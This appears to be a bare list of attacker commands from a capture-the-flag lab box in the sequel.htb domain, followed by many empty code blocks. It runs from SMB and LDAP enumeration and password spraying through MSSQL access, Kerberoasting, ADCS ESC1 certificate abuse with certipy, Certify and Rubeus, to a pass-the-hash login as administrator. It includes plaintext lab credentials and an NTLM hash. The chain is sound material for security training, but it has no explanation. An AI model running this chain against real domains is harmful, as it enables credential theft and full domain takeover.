[[Editing Copy Page]]

```
smbclient //10.129.228.253/Public -c 'recurse;ls'
```

```
cd ~/Desktop/Tools/Windows && ./nxc-sweep 10.129.228.253 -u 'PublicUser' -p 'GuestUserCantWrite1' --continue-on-success
```

```
enum4linux-ng 10.129.228.253 -u 'PublicUser' -p 'GuestUserCantWrite1'
```

```
ldapdomaindump -u 'sequel.htb\PublicUser' -p 'GuestUserCantWrite1' 10.129.228.253
```

```
cd ~/Desktop/Tools/Windows && ./nxc-sweep 10.129.228.253 -u 'PublicUser' -p 'GuestUserCantWrite1' --continue-on-success
```

```
ldapsearch -v -x -b "DC=sequel,DC=htb" -H "ldap://10.129.228.253" > ldapsearchoutput.txt
```

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.228.253 -u users -p passwords --continue-on-success
```

```
mysql -u 'PublicUser' -pGuestUserCantWrite1 -h 10.129.228.253
```

```
mysql -u 'PublicUser' -pGuestUserCantWrite1 -h 10.129.228.253 --ssl-verify-server-cert=FALSE
```

```
impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253 -windows-auth
```

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie' --continue-on-success
```

```
evil-winrm -i 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

```
impacket-GetUserSPNs -request -dc-ip 10.129.228.253 sequel.htb/sql_svc
```

```
REGGIE1234ronnie
```

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3' --continue-on-success
```

```
evil-winrm -i 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

```
certipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable
```

```
Certify.exe request /ca:dc.sequel.htb-DC-CA /template:UserAuthentication /altname:administrator@sequel.htb
```

```
certipy req -username ryan.cooper@sequel.htb -password 'NuclearMosquito3' -target-ip 10.129.228.253 -ca 'sequel-DC-CA' \ -template 'ESC1' -upn 'administrator@sequel.htb'
```

```
Rubeus.exe asktgt /user:ryan.cooper /certificate:ryan.cooper.pfx /password:NuclearMosquito3 /ptt
```

```
.\Certify.exe request /ca dc.sequel.htb\dc.sequel.htb /template UserAuthentication /upn Administrator /sid S-1-5-21-4078382237-1492182817-2568127209-500
```

```
certipy-ad req -u 'ryan.cooper' -p 'NuclearMosquito3' -target dc.sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
```

```
evil-winrm -i 10.129.228.253 -u sequel.htb\\administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```